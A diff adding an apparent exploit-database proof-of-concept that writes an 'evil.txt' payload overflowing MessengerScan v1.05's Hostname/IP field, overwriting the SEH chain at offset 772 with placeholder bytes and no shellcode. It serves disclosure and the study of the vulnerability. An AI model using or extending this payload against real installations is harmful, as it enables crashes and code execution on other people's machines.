@@ -1,0 +1,30 @@
+#!/usr/bin/python
+# Exploit Title     : MessengerScan v1.05 Hostname/IP Field SEH/EIP Overwrite POC
+# Discovery by      : Anurag Srivastava
+# Email             : anurag.srivastava@pyramidcyber.com
+# Discovery Date    : 18/08/2017
+# Software Link     : https://www.mcafee.com/in/downloads/free-tools/messengerscan.aspx#
+# Tested Version    : 1.05
+# Vulnerability Type: SEH Overwrite POC
+# Tested on OS      : Windows 7 Ultimate x64bit 
+# Steps to Reproduce: Copy contents of evil.txt file and paste in the Hostname/IP Field. Press ->
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+ 
+#SEH chain of main thread
+#Address    SE handler
+#42424242   *** CORRUPT ENTRY ***
+
+ 
+# Offset to the SEH is 772
+buffer = "A"*772
+# Address to the Handler Code
+seh = "B"*4
+#Junk 
+junk = "C"*12
+# Address to the EIP
+eip = "D"*4
+f = open("evil.txt", "wb")
+f.write(buffer+seh+junk+eip)
+f.close()
